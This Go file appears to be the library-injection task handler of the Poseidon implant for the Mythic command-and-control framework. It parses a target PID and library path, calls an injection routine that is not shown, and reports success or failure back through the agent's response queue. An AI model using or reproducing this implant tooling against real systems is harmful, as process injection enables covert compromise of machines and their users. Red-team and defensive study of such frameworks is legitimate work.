package libinject

import (
	// Standard
	"encoding/json"
	"fmt"
	"sync"

	// Poseidon
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/profiles"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

var mu sync.Mutex

// Inject C source taken from: http://www.newosxbook.com/src.jl?tree=listings&file=inject.c
type Injection interface {
	TargetPid() int
	Shellcode() []byte
	Success() bool
	SharedLib() string
}

type Arguments struct {
	PID         int    `json:"pid"`
	LibraryPath string `json:"library"`
}

func Run(task structs.Task) {
	msg := structs.Response{}
	msg.TaskID = task.TaskID

	args := Arguments{}
	err := json.Unmarshal([]byte(task.Params), &args)

	if err != nil {
		msg.UserOutput = err.Error()
		msg.Completed = true
		msg.Status = "error"

		resp, _ := json.Marshal(msg)
		mu.Lock()
		profiles.TaskResponses = append(profiles.TaskResponses, resp)
		mu.Unlock()
		return
	}

	result, err := injectLibrary(args.PID, args.LibraryPath)

	if err != nil {
		msg.UserOutput = err.Error()
		msg.Completed = true
		msg.Status = "error"

		resp, _ := json.Marshal(msg)
		mu.Lock()
		profiles.TaskResponses = append(profiles.TaskResponses, resp)
		mu.Unlock()
		return
	}

	if result.Success() {
		msg.UserOutput = fmt.Sprintf("Successfully injected %s injection into pid: %d ", args.LibraryPath, args.PID)
	} else {
		msg.UserOutput = fmt.Sprintf("Failed to inject %s into pid: %d ", args.LibraryPath, args.PID)
	}

	msg.Completed = true
	resp, _ := json.Marshal(msg)
	mu.Lock()
	profiles.TaskResponses = append(profiles.TaskResponses, resp)
	mu.Unlock()
	return
}
